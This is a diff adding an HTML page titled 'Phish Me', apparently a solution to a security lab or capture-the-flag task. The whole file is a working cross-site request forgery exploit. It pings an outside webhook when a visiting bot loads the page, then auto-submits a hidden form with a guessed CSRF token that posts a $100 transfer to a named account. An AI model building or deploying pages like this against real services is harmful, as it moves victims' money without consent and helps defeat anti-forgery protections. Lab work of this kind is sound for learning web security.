@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Phish Me</title>
+</head>
+<body>
+  <!-- notify your webhook that the bot loaded this page -->
+  <script>
+    new Image().src = "https://eok9itjcz7vwbnr.m.pipedream.net/?hit=phish";
+  </script>
+
+  <!-- auto-submit the transfer as z5640334 -->
+  <form id="transfer" method="POST" action="/api/transfer">
+    <input type="hidden" name="csrf_token" value="MTU1OQ==">
+    <input type="hidden" name="username"   value="z5640334">
+    <input type="hidden" name="amount"     value="100">
+  </form>
+
+  <script>
+    // wait a moment for the webhook ping, then drain the $100
+    setTimeout(() => document.getElementById('transfer').submit(), 50);
+  </script>
+</body>
+</html>
